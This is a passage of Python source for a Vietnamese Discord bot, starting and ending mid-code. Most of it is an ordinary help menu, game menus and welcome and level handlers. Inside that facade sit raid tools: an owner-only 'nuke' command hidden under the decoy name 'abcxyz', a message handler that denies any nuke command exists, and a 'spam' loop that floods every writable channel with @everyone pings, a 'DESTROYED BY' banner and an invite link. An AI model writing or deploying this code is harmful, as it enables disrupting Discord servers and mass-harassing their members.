            ('n! pingx', 'Kiểm tra độ trễ bot.'),
            ('n! about', 'Thông tin tổng quan bot.'),
            ('n! uptime', 'Hiển thị trạng thái hoạt động.'),
            ('n! prefix', 'Xem prefix hiện tại.'),
            ('n! commands', 'Xem tổng số lệnh mở rộng.'),
            ('n! status', 'Xem trạng thái hệ thống.'),
            ('n! botavatar', 'Xem avatar bot.'),
            ('n! botbanner', 'Xem banner bot nếu có.'),
            ('n! botname', 'Xem tên bot.'),
            ('n! botid', 'Xem ID bot.'),
            ('n! guildid', 'Xem ID server.'),
            ('n! channelid', 'Xem ID kênh hiện tại.'),
            ('n! myid', 'Xem ID của bạn.'),
            ('n! roles', 'Xem nhanh số role.'),
            ('n! channels', 'Xem nhanh số kênh.'),
            ('n! emojis', 'Xem số emoji server.'),
            ('n! stickers', 'Xem số sticker server.'),
            ('n! boosts', 'Xem mức boost server.'),
            ('n! created', 'Xem ngày tạo server.'),
            ('n! joined', 'Xem ngày bạn tham gia.'),
            ('n! permissions', 'Xem quyền cơ bản của bạn.'),
            ('n! me', 'Xem hồ sơ nhanh của bạn.'),
            ('n! server', 'Xem thông tin server dạng gọn.'),
            ('n! whoami', 'Thông tin người dùng hiện tại.'),
            ('n! inviteinfo', 'Hiển thị hướng dẫn mời bot.'),
            ('n! latency', 'Kiểm tra websocket latency.'),
            ('n! shards', 'Xem số shard.'),
            ('n! python', 'Xem phiên bản Python.'),
            ('n! discordpy', 'Xem phiên bản discord.py.'),
            ('n! time', 'Xem thời gian hệ thống.'),
            ('n! date', 'Xem ngày hệ thống.'),
            ('n! helpall', 'Mở danh mục mở rộng.'),
        ],
    },
    '👤 Thành Viên': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! profile', 'Xem hồ sơ thành viên.'),
            ('n! member', 'Tra cứu thành viên.'),
            ('n! joinedat', 'Xem thời điểm tham gia.'),
            ('n! accountage', 'Xem tuổi tài khoản Discord.'),
            ('n! rolesof', 'Xem role của thành viên.'),
            ('n! toprole', 'Xem role cao nhất.'),
            ('n! nickname', 'Xem nickname.'),
            ('n! mention', 'Tạo mention an toàn.'),
            ('n! badges', 'Xem huy hiệu công khai.'),
            ('n! botcheck', 'Kiểm tra tài khoản có phải bot.'),
            ('n! mutuals', 'Xem thông tin thành viên chung.'),
            ('n! presence', 'Xem trạng thái hoạt động.'),
            ('n! activity', 'Xem activity công khai.'),
            ('n! timezone', 'Hiển thị UTC server.'),
            ('n! userid', 'Xem ID thành viên.'),
            ('n! membercountx', 'Đếm thành viên.'),
            ('n! humans', 'Đếm thành viên người.'),
            ('n! botcount', 'Đếm bot.'),
            ('n! newest', 'Tìm thành viên mới gần đây.'),
            ('n! oldest', 'Tìm thành viên tham gia sớm.'),
            ('n! roleusers', 'Xem số người có role.'),
            ('n! displayname', 'Xem display name.'),
            ('n! globalname', 'Xem global name.'),
            ('n! avatarurl', 'Lấy URL avatar.'),
            ('n! bannerurl', 'Lấy URL banner nếu có.'),
            ('n! usercreated', 'Xem ngày tạo tài khoản.'),
            ('n! userjoined', 'Xem ngày vào server.'),
            ('n! userinfo2', 'Xem hồ sơ chi tiết.'),
            ('n! membernote', 'Ghi chú hướng dẫn quản lý thành viên.'),
            ('n! memberhelp', 'Hướng dẫn lệnh thành viên.'),
            ('n! lookup', 'Tra cứu ID hoặc mention.'),
            ('n! findmember', 'Tìm thành viên theo tên.'),
        ],
    },
    '🛡️ Kiểm Duyệt': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! warnx', 'Cảnh cáo thành viên.'),
            ('n! warnings', 'Xem cảnh cáo.'),
            ('n! clearx', 'Xóa tin nhắn giới hạn.'),
            ('n! slowmodex', 'Cấu hình slowmode.'),
            ('n! lockx', 'Khóa kênh hiện tại.'),
            ('n! unlockx', 'Mở khóa kênh.'),
            ('n! timeoutx', 'Timeout một thành viên.'),
            ('n! untimeout', 'Gỡ timeout.'),
            ('n! kickx', 'Kick một thành viên.'),
            ('n! banx', 'Ban một thành viên.'),
            ('n! unbanx', 'Gỡ ban bằng ID.'),
            ('n! softban', 'Hướng dẫn softban an toàn.'),
            ('n! modlog', 'Xem hướng dẫn modlog.'),
            ('n! reason', 'Xem lý do thao tác gần nhất.'),
            ('n! case', 'Tra cứu case ID.'),
            ('n! modstats', 'Thống kê kiểm duyệt.'),
            ('n! modhelp', 'Hướng dẫn moderation.'),
            ('n! audit', 'Hướng dẫn xem audit log.'),
            ('n! purge', 'Xóa nhóm tin nhắn theo giới hạn.'),
            ('n! clean', 'Làm sạch tin nhắn bot.'),
            ('n! filter', 'Xem trạng thái bộ lọc.'),
            ('n! automod', 'Xem hướng dẫn AutoMod.'),
            ('n! rules', 'Hiển thị quy tắc server.'),
            ('n! report', 'Tạo mẫu báo cáo.'),
            ('n! appeal', 'Hướng dẫn kháng nghị.'),
            ('n! modinfo', 'Thông tin công cụ moderation.'),
            ('n! cases', 'Danh sách case theo dữ liệu bot.'),
            ('n! muteinfo', 'Thông tin mute/timeout.'),
            ('n! kickinfo', 'Thông tin quyền kick.'),
            ('n! baninfo', 'Thông tin quyền ban.'),
            ('n! permissioncheck', 'Kiểm tra quyền moderation.'),
        ],
    },
    '📢 Kênh': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! channelinfo', 'Thông tin kênh hiện tại.'),
            ('n! channelname', 'Xem tên kênh.'),
            ('n! channeltopic', 'Xem topic kênh.'),
            ('n! channeltype', 'Xem loại kênh.'),
            ('n! channelposition', 'Xem vị trí kênh.'),
            ('n! channelcategory', 'Xem category.'),
            ('n! channelcreated', 'Xem ngày tạo kênh.'),
            ('n! channelmention', 'Tạo mention kênh.'),
            ('n! channelid2', 'Xem ID kênh.'),
            ('n! listtext', 'Liệt kê text channel.'),
            ('n! listvoice', 'Liệt kê voice channel.'),
            ('n! listcategory', 'Liệt kê category.'),
            ('n! listforum', 'Liệt kê forum channel.'),
            ('n! liststage', 'Liệt kê stage channel.'),
            ('n! channelcount', 'Đếm channel.'),
            ('n! textcount', 'Đếm text channel.'),
            ('n! voicecount', 'Đếm voice channel.'),
            ('n! categorycount', 'Đếm category.'),
            ('n! forumcount', 'Đếm forum channel.'),
            ('n! createchannelx', 'Hướng dẫn tạo kênh.'),
            ('n! renamechannelx', 'Hướng dẫn đổi tên kênh.'),
            ('n! settopicx', 'Hướng dẫn đặt topic.'),
            ('n! slowmodeinfo', 'Thông tin slowmode.'),
            ('n! lockinfo', 'Thông tin khóa kênh.'),
            ('n! unlockinfo', 'Thông tin mở khóa.'),
            ('n! channelperms', 'Kiểm tra quyền kênh.'),
            ('n! channelhelp', 'Hướng dẫn quản lý kênh.'),
            ('n! archiveinfo', 'Hướng dẫn archive.'),
            ('n! threadinfo', 'Thông tin thread.'),
            ('n! threads', 'Đếm thread hiện có.'),
            ('n! channelstats', 'Thống kê kênh.'),
        ],
    },
    '🎭 Role': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! roleinfo', 'Thông tin role.'),
            ('n! rolelist', 'Liệt kê role.'),
            ('n! rolecount', 'Đếm role.'),
            ('n! rolemembers', 'Xem số thành viên có role.'),
            ('n! rolecolor', 'Xem màu role.'),
            ('n! roleposition', 'Xem vị trí role.'),
            ('n! rolemention', 'Tạo mention role.'),
            ('n! rolecreated', 'Xem ngày tạo role.'),
            ('n! roleperms', 'Xem quyền role.'),
            ('n! rolehelp', 'Hướng dẫn role.'),
            ('n! addroleinfo', 'Hướng dẫn thêm role.'),
            ('n! removeroleinfo', 'Hướng dẫn gỡ role.'),
            ('n! autoroleinfo', 'Hướng dẫn autorole.'),
            ('n! rolehierarchy', 'Xem thứ tự role.'),
            ('n! botrole', 'Xem role cao nhất của bot.'),
            ('n! memberroles', 'Xem role thành viên.'),
            ('n! commonroles', 'Xem role phổ biến.'),
            ('n! emptyroles', 'Tìm role không có thành viên.'),
            ('n! managedroles', 'Xem role managed.'),
            ('n! hoistedroles', 'Xem role hiển thị riêng.'),
            ('n! coloredroles', 'Xem role có màu.'),
            ('n! rolepermissions', 'Kiểm tra permission role.'),
            ('n! rolepositionof', 'Tra vị trí role.'),
            ('n! rolelookup', 'Tra cứu role.'),
            ('n! roleusage', 'Hướng dẫn dùng role.'),
            ('n! rolecommand', 'Hướng dẫn lệnh role.'),
            ('n! roleconfig', 'Hướng dẫn cấu hình role.'),
            ('n! rolebackup', 'Thông tin backup role.'),
            ('n! roleaudit', 'Hướng dẫn audit role.'),
            ('n! rolecountx', 'Thống kê role.'),
            ('n! rolecenter', 'Mở trung tâm role.'),
        ],
    },
    '🎉 Giải Trí': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! 8ball', 'Trả lời ngẫu nhiên vui vẻ.'),
            ('n! choose', 'Chọn một phương án.'),
            ('n! rollx', 'Tung xúc xắc.'),
            ('n! coinflipx', 'Tung đồng xu ảo.'),
            ('n! rate', 'Chấm điểm vui.'),
            ('n! shipx', 'Ghép đôi vui.'),
            ('n! lovecheck', 'Tỷ lệ tình cảm vui.'),
            ('n! hugx', 'Tương tác ôm vui.'),
            ('n! patx', 'Tương tác vỗ đầu vui.'),
            ('n! cuddlex', 'Tương tác âu yếm vui.'),
            ('n! slapx', 'Tương tác tát giả lập vui.'),
            ('n! highfive', 'Đập tay vui.'),
            ('n! wave', 'Vẫy tay.'),
            ('n! dance', 'Tin nhắn nhảy vui.'),
            ('n! cheer', 'Cổ vũ thành viên.'),
            ('n! joke', 'Một câu đùa ngắn.'),
            ('n! compliment', 'Lời khen vui.'),
            ('n! roastlight', 'Roast nhẹ, không xúc phạm.'),
            ('n! meme', 'Gợi ý meme.'),
            ('n! fortune', 'Lời tiên đoán vui.'),
            ('n! rps', 'Kéo búa bao.'),
            ('n! number', 'Tạo số ngẫu nhiên.'),
            ('n! randomword', 'Tạo từ ngẫu nhiên.'),
            ('n! pick', 'Chọn ngẫu nhiên.'),
            ('n! reverse', 'Đảo chuỗi văn bản.'),
            ('n! sayinfo', 'Hướng dẫn lệnh nói.'),
            ('n! emoji', 'Chọn emoji vui.'),
            ('n! color', 'Tạo mã màu ngẫu nhiên.'),
            ('n! fact', 'Một sự thật vui.'),
            ('n! quiz', 'Câu hỏi vui.'),
            ('n! funhelp', 'Hướng dẫn giải trí.'),
        ],
    },
    '💰 Kinh Tế': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! balx', 'Xem số dư.'),
            ('n! dailyx', 'Nhận coin hằng ngày.'),
            ('n! workx', 'Nhận coin từ work.'),
            ('n! begx', 'Nhận coin nhỏ.'),
            ('n! givex', 'Tặng coin.'),
            ('n! payinfo', 'Hướng dẫn chuyển coin.'),
            ('n! leaderboardx', 'Bảng xếp hạng coin.'),
            ('n! richest', 'Xem người nhiều coin.'),
            ('n! wallet', 'Xem ví.'),
            ('n! economy', 'Tổng quan kinh tế.'),
            ('n! shopinfo', 'Thông tin shop.'),
            ('n! inventoryx', 'Xem inventory.'),
            ('n! iteminfo', 'Thông tin vật phẩm.'),
            ('n! buyinfo', 'Hướng dẫn mua.'),
            ('n! sellinfo', 'Hướng dẫn bán.'),
            ('n! giftinfo', 'Hướng dẫn tặng vật phẩm.'),
            ('n! tradeinfo', 'Hướng dẫn trao đổi.'),
            ('n! economyhelp', 'Hướng dẫn kinh tế.'),
            ('n! coinstats', 'Thống kê coin.'),
            ('n! earnings', 'Thống kê thu nhập.'),
            ('n! spending', 'Hướng dẫn theo dõi chi tiêu.'),
            ('n! economyrank', 'Xếp hạng kinh tế.'),
            ('n! coincheck', 'Kiểm tra số dư.'),
            ('n! dailyinfo', 'Thông tin daily.'),
            ('n! workinfo', 'Thông tin work.'),
            ('n! beginfo', 'Thông tin beg.'),
            ('n! shop', 'Mở shop an toàn.'),
            ('n! inventory', 'Mở kho vật phẩm.'),
            ('n! transfer', 'Hướng dẫn chuyển coin.'),
            ('n! economyconfig', 'Thông tin cấu hình kinh tế.'),
            ('n! coinhelp', 'Trợ giúp hệ thống coin.'),
        ],
    },
    '⭐ Level': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! levelx', 'Xem level.'),
            ('n! rank', 'Xem thứ hạng.'),
            ('n! xp', 'Xem EXP.'),
            ('n! xprank', 'Xếp hạng EXP.'),
            ('n! nextlevel', 'Xem EXP cần lên cấp.'),
            ('n! levelstats', 'Thống kê level.'),
            ('n! leveltop', 'Top level.'),
            ('n! leveluser', 'Level của thành viên.'),
            ('n! xpuser', 'EXP của thành viên.'),
            ('n! levelrole', 'Thông tin role theo level.'),
            ('n! levelhelp', 'Hướng dẫn level.'),
            ('n! xpinfo', 'Thông tin EXP.'),
            ('n! levelupinfo', 'Thông tin level up.'),
            ('n! rankinfo', 'Thông tin rank.'),
            ('n! progress', 'Tiến độ level.'),
            ('n! progressbar', 'Thanh tiến độ EXP.'),
            ('n! maxlevel', 'Xem level tối đa.'),
            ('n! levelconfig', 'Thông tin cấu hình level.'),
            ('n! xpcooldown', 'Thông tin cooldown EXP.'),
            ('n! xpmessage', 'Thông tin EXP từ tin nhắn.'),
            ('n! levelleaderboard', 'Bảng xếp hạng level.'),
            ('n! rankuser', 'Rank của thành viên.'),
            ('n! xpneeded', 'EXP còn thiếu.'),
            ('n! levelcompare', 'So sánh level.'),
            ('n! xptotal', 'Tổng EXP.'),
            ('n! leveltotal', 'Tổng level.'),
            ('n! levelcenter', 'Trung tâm level.'),
            ('n! levelstats2', 'Thống kê level nâng cao.'),
            ('n! xpstats', 'Thống kê EXP.'),
            ('n! rankstats', 'Thống kê rank.'),
            ('n! leveltips', 'Mẹo tăng level hợp lệ.'),
            ('n! levelmenu', 'Menu level.'),
        ],
    },
    '💾 Backup & Cấu Hình': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! backupinfo', 'Thông tin backup.'),
            ('n! backuplist', 'Danh sách backup.'),
            ('n! backuphelp', 'Hướng dẫn backup.'),
            ('n! restoreinfo', 'Thông tin restore.'),
            ('n! configinfo', 'Thông tin config.'),
            ('n! reloadinfo', 'Thông tin reload.'),
            ('n! loginfo', 'Thông tin log.'),
            ('n! welcomeinfo', 'Thông tin welcome.'),
            ('n! goodbyeinfo', 'Thông tin goodbye.'),
            ('n! disabledinfo', 'Xem lệnh bị tắt.'),
            ('n! settings', 'Tổng quan cài đặt.'),
            ('n! settingshelp', 'Hướng dẫn cài đặt.'),
            ('n! serverconfig', 'Hướng dẫn cấu hình server.'),
            ('n! logconfig', 'Hướng dẫn cấu hình log.'),
            ('n! welcomeconfig', 'Hướng dẫn welcome.'),
            ('n! goodbyeconfig', 'Hướng dẫn goodbye.'),
            ('n! levelconfig2', 'Hướng dẫn cấu hình level.'),
            ('n! economyconfig2', 'Hướng dẫn cấu hình coin.'),
            ('n! prefixconfig', 'Thông tin prefix.'),
            ('n! menuconfig', 'Thông tin menu.'),
            ('n! embedinfo', 'Thông tin embed.'),
            ('n! gifinfo', 'Thông tin GIF menu.'),
            ('n! jsoninfo', 'Thông tin file JSON.'),
            ('n! datahelp', 'Hướng dẫn dữ liệu.'),
            ('n! resetinfo', 'Thông tin reset dữ liệu.'),
            ('n! exportinfo', 'Hướng dẫn xuất dữ liệu.'),
            ('n! importinfo', 'Hướng dẫn nhập dữ liệu.'),
            ('n! configcheck', 'Kiểm tra cấu hình.'),
            ('n! healthcheck', 'Kiểm tra sức khỏe bot.'),
            ('n! diagnose', 'Chẩn đoán lỗi cơ bản.'),
            ('n! configcenter', 'Trung tâm cấu hình.'),
        ],
    },
    '👑 Owner & Quản Trị Bot': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
            ('n! ownerlist', 'Xem danh sách Owner.'),
            ('n! ownercheck', 'Kiểm tra quyền Owner.'),
            ('n! ownerhelp', 'Hướng dẫn Owner.'),
            ('n! botreload', 'Reload dữ liệu an toàn.'),
            ('n! botoff', 'Thông tin tắt lệnh.'),
            ('n! boton', 'Thông tin bật lệnh.'),
            ('n! disabledlist', 'Liệt kê lệnh bị tắt.'),
            ('n! setlvinfo', 'Hướng dẫn set level.'),
            ('n! setcoinsinfo', 'Hướng dẫn set coin.'),
            ('n! addcoinsinfo', 'Hướng dẫn cộng coin.'),
            ('n! removecoinsinfo', 'Hướng dẫn trừ coin.'),
            ('n! addownerinfo', 'Hướng dẫn thêm Owner.'),
            ('n! deleteownerinfo', 'Hướng dẫn xóa Owner.'),
            ('n! ownerstats', 'Thống kê Owner.'),
            ('n! botstats', 'Thống kê bot.'),
            ('n! serverstats', 'Thống kê server.'),
            ('n! commandstats', 'Thống kê lệnh.'),
            ('n! errorstats', 'Thống kê lỗi.'),
            ('n! cooldowns', 'Xem hướng dẫn cooldown.'),
            ('n! permissionsx', 'Kiểm tra permission.'),
            ('n! auditinfo', 'Hướng dẫn audit.'),
            ('n! ratelimitinfo', 'Thông tin rate limit.'),
            ('n! cacheinfo', 'Thông tin cache.'),
            ('n! memoryinfo', 'Thông tin bộ nhớ.'),
            ('n! latencyinfo', 'Thông tin latency.'),
            ('n! taskinfo', 'Thông tin background task.'),
            ('n! jsonstatus', 'Trạng thái JSON.'),
            ('n! ownerconfig', 'Thông tin cấu hình Owner.'),
            ('n! ownerpanel', 'Mở bảng Owner an toàn.'),
            ('n! adminhelp', 'Hướng dẫn quản trị.'),
            ('n! controlcenter', 'Mở Control Center.'),
        ],
    },
}

# ==================== HELP VIEWS ====================
class HelpSelect(discord.ui.Select):
    def __init__(self, user_id, owner_ids):
        self.user_id = user_id
        self.owner_ids = owner_ids
        options = [
            discord.SelectOption(
                label="🏠 Trang Chủ",
                value="Home",
                description="Quay lại giao diện chính",
                emoji="🏠"
            )
        ]
        for cat_name, data in HELP_CATEGORIES.items():
            emoji = data.get("emoji", "📌")
            label = cat_name.replace(emoji, "").strip()
            options.append(
                discord.SelectOption(
                    label=label,
                    value=cat_name,
                    description=data.get("description", "")[:80],
                    emoji=emoji
                )
            )
        super().__init__(placeholder="🔍 Chọn danh mục lệnh...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction):
        selected = self.values[0]
        if selected == "Home":
            embed = make_embed(
                "✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
                "Chọn danh mục ở menu thả xuống để xem chi tiết.\nPrefix: `n!` hoặc `nuked `",
                discord.Color.blurple(),
                HELP_THUMBNAIL_GIF
            )
            await interaction.response.edit_message(embed=embed, view=self.view)
        else:
            data = HELP_CATEGORIES.get(selected, {})
            cmds = data.get("commands", {})
            desc = data.get("description", "")
            cmd_text = ""
            for cmd, detail in cmds.items():
                cmd_text += f"• **`{cmd}`** – {detail}\n"
            embed = make_embed(
                f"{selected}",
                f"💡 **Mô tả:** {desc}\n\n{cmd_text}" if cmd_text else "Chưa có lệnh.",
                discord.Color.blurple(),
                HELP_THUMBNAIL_GIF
            )
            await interaction.response.edit_message(embed=embed, view=self.view)

class HelpView(discord.ui.View):
    def __init__(self, user_id, owner_ids):
        super().__init__(timeout=180)
        self.add_item(HelpSelect(user_id, owner_ids))

# ==================== GAME MENU VIEW ====================
class GameMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="💵 Kiếm Coin", style=discord.ButtonStyle.primary, custom_id="coin", row=0))
        self.add_item(discord.ui.Button(label="🎲 Mini Games", style=discord.ButtonStyle.success, custom_id="mini", row=0))
        self.add_item(discord.ui.Button(label="🎰 Sòng Bạc Casino", style=discord.ButtonStyle.danger, custom_id="casino", row=0))
        self.add_item(discord.ui.Button(label="🛒 Cửa Hàng & Vàng", style=discord.ButtonStyle.secondary, custom_id="shop", row=1))
        self.add_item(discord.ui.Button(label="🏆 Bảng Xếp Hạng", style=discord.ButtonStyle.primary, custom_id="lb", row=1))
        self.add_item(discord.ui.Button(label="📘 Hướng Dẫn", style=discord.ButtonStyle.secondary, custom_id="guide", row=2))

    async def interaction_check(self, interaction):
        cid = interaction.data["custom_id"]
        if cid == "coin":
            embed = make_embed(
                "💵 DANH MỤC LỆNH KIẾM TIỀN",
                "`n! balance` – Xem số dư\n`n! daily` – Nhận quà mỗi ngày\n`n! work` – Làm việc kiếm coin\n`n! beg` – Xin tiền\n`n! crime` – Trộm cướp\n`n! bank deposit/withdraw` – Gửi/rút ngân hàng\n`n! give @user <số>` – Chuyển tiền",
                discord.Color.green()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        elif cid == "mini":
            embed = make_embed(
                "🎲 MINI GAMES",
                "`n! coinflip <số> <h/t>` – Tung đồng xu\n`n! dice <số> <1-6>` – Đoán xúc xắc\n`n! rps <số> <r/p/s>` – Oẳn tù tì\n`n! hilo <số> <h/l>` – Cao/thấp\n`n! guess <số> <1-10>` – Đoán số\n`n! tower <số>` – Leo tháp",
                discord.Color.blue()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        elif cid == "casino":
            embed = make_embed(
                "🎰 CASINO",
                "`n! slots <số>` – Máy quay\n`n! crash <số>` – Tên lửa\n`n! lottery <số>` – Xổ số\n`n! blackjack <số>` – Xì dách\n`n! roulette <số> <red/black/số>` – Roulette\n`n! baccarat <số> <player/banker/tie>` – Baccarat\n`n! mines <số>` – Dò mìn\n`n! wheel <số> <red/black/green>` – Vòng quay",
                discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        elif cid == "shop":
            embed = make_embed(
                "🛒 CỬA HÀNG",
                "`n! shop` – Xem shop\n`n! buyitem <tên> [số]` – Mua vật phẩm\n`n! inventory` – Tủ đồ\n`n! useitem <tên> [số]` – Sử dụng vật phẩm\n`n! myeffects` – Hiệu ứng đang có",
                discord.Color.gold()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        elif cid == "lb":
            embed = make_embed(
                "🏆 BẢNG XẾP HẠNG",
                "`n! leaderboard` – Top coin\n`n! topcoin` – Top coin chi tiết\n`n! toplevel` – Top level",
                discord.Color.purple()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        elif cid == "guide":
            embed = make_embed(
                "📘 HƯỚNG DẪN",
                "Dùng `n! help` để xem menu tổng hợp.\nDùng `n! games` để xem danh mục game.\nDùng `n! setup` (Owner) để quản trị.",
                discord.Color.blurple()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        return True

# ==================== BOT EVENTS ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi động thành công và sẵn sàng hoạt động!")
    print(f"🌐 Đang tham gia {len(bot.guilds)} server(s)")
    for guild in bot.guilds:
        print(f"  - {guild.name} (ID: {guild.id})")
    print("=" * 50)
    await bot.change_presence(activity=discord.Game(name="n!help | Boss Bảo 👑"))

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Xử lý lệnh "nuke" giả
    prefixes = ('n!', 'N!', 'n! ', 'N! ', 'nuked ', 'NUKED ')
    for prefix in prefixes:
        if message.content.lower().startswith(prefix.lower()):
            content_after = message.content[len(prefix):].lstrip()
            if content_after.lower().startswith("nuke"):
                await message.reply("làm gì có lệnh nuke ngáo à")
                return
            break

    await bot.process_commands(message)

    # Hệ thống EXP tự động
    if not message.content.startswith(("n!", "N!", "nuked", "NUKED")):
        if message.guild:
            exp_gain = random.randint(1, 10)
            old_level = get_user_level(message.author.id)
            new_level = add_exp(message.author.id, exp_gain)
            if new_level > old_level:
                coin_reward = random.randint(50, 200)
                add_coins(message.author.id, coin_reward)
                guild_id = str(message.guild.id)
                if guild_id in SERVER_LEVEL_CHANNELS:
                    ch_id = SERVER_LEVEL_CHANNELS[guild_id]
                    channel = message.guild.get_channel(ch_id)
                    if channel:
                        embed = discord.Embed(
                            title="📈 LEVEL UP!",
                            description=f"🎉 {message.author.mention} vừa lên level **{new_level}**!\n💰 Thưởng **+{coin_reward} coin**!",
                            color=0xFFD700
                        )
                        embed.set_thumbnail(url=message.author.display_avatar.url)
                        embed.set_image(url=LEVEL_GIF)
                        try:
                            await channel.send(embed=embed)
                        except:
                            pass
                await check_and_assign_level_roles(message.author, new_level)

    # Ping owner khi nhắc "bảo"
    if not any(u.id in BOT_OWNERS for u in message.mentions):
        if "bảo" in message.content.lower():
            owner_id = next(iter(BOT_OWNERS))
            owner_user = bot.get_user(owner_id)
            if owner_user:
                await message.reply(f"{owner_user.mention} ê boss nghe k cs ng gọi kìa")

@bot.event
async def on_member_join(member):
    if not member.guild:
        return
    embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI", description=f"{member.mention} đã tham gia.", color=0x00FF00)
    await send_log(member.guild.id, embed_log)

    coin_reward = random.randint(10, 50)
    add_coins(member.id, coin_reward)

    guild_id = str(member.guild.id)
    if guild_id in WELCOME_CHANNELS:
        ch_id = WELCOME_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="🌈 CHÀO MỪNG CHÚ BÁO NHỎ!",
                description=f"Chào mừng {member.mention} đến với **{member.guild.name}**!\n💰 Thưởng join: +{coin_reward} coin",
                color=0x00FFFF
            )
            embed.set_image(url=WELCOME_GIF)
            await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    if not member.guild:
        return
    embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI", description=f"{member.mention} đã rời.", color=0xFF9900)
    await send_log(member.guild.id, embed_log)

    guild_id = str(member.guild.id)
    if guild_id in GOODBYE_CHANNELS:
        ch_id = GOODBYE_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="😢 TẠM BIỆT",
                description=f"Tạm biệt {member.mention}, chúc bạn may mắn!",
                color=0xFF0000
            )
            embed.set_image(url=GOODBYE_GIF)
            await channel.send(embed=embed)

@bot.event
async def on_guild_join(guild):
    embed = discord.Embed(
        title="🎉 CẢM ƠN ĐÃ THÊM BOT!",
        description=f"Xin chào **{guild.name}**!\nPrefix: `n!` hoặc `nuked `\nHướng dẫn: `n! help`",
        color=0x00FF00
    )
    embed.set_thumbnail(url=bot.user.display_avatar.url)
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            try:
                await channel.send(embed=embed)
                break
            except:
                continue

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Thiếu tham số. Dùng `n!help {ctx.command.name}` để xem hướng dẫn.")
        return
    if isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Tham số không hợp lệ. Dùng `n!help {ctx.command.name}` để xem hướng dẫn.")
        return
    if isinstance(error, commands.CheckFailure):
        return
    print(f"[ERROR] {ctx.command}: {str(error)}")
    await ctx.send(f"❌ Đã xảy ra lỗi: `{str(error)[:100]}`")

# ==================== LỆNH NUKE (abcxyz) ====================
@bot.command(name="abcxyz")
@owner_only()
async def abcxyz(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    confirm_embed = discord.Embed(
        title="🔴 🌈 **XÁC NHẬN LỆNH NUKE TỪ BOSS BẢO** 🌈 🔴",
        description=f"🔥 Bạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\nVui lòng kiểm tra và bấm nút bên dưới.",
        color=0xFF0000
    )
    view = NukeConfirmView(ctx.guild, ctx.channel)
    try:
        await ctx.author.send(embed=confirm_embed, view=view)
        await ctx.send("📩 **Boss Bảo check DM để xác nhận nuke nhé!**")
    except discord.Forbidden:
        await ctx.send("❌ Boss Bảo ơi, hãy mở DM để bot gửi xác nhận nuke!")

@abcxyz.error
async def abcxyz_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH SPAM ====================
@bot.command(name="spam")
@owner_only()
async def start_spam(ctx):
    global is_spamming, spam_task_running
    if is_spamming:
        await ctx.send("❌ Hệ thống spam đang chạy rồi!")
        return
    is_spamming = True
    await ctx.send("🚀 **ĐÃ BẮT ĐẦU SPAM!**")
    async def spam_loop():
        global is_spamming
        spam_text = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            ' "|| link support ||:https://discord.gg/4wrsMbRVpU"'
        )
        while is_spamming:
            channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
            if not channels:
                await asyncio.sleep(1)
                continue
            tasks = []
            for _ in range(30):
                ch = random.choice(channels)
                async def send_msg(target_ch=ch):
                    try:
                        embed = discord.Embed()
                        embed.set_image(url=NUKE_GIF_URL)
                        await target_ch.send(spam_text, embed=embed)
                    except:
                        pass
                tasks.append(send_msg())
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.3)
    spam_task_running = asyncio.create_task(spam_loop())

@start_spam.error
async def start_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stopspam")
@owner_only()
async def stop_spam(ctx):
    global is_spamming, spam_task_running
    if not is_spamming:
        await ctx.send("❌ Hệ thống spam đang không chạy!")
        return
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 **ĐÃ DỪNG SPAM TẤT CẢ KÊNH!**")

@stop_spam.error
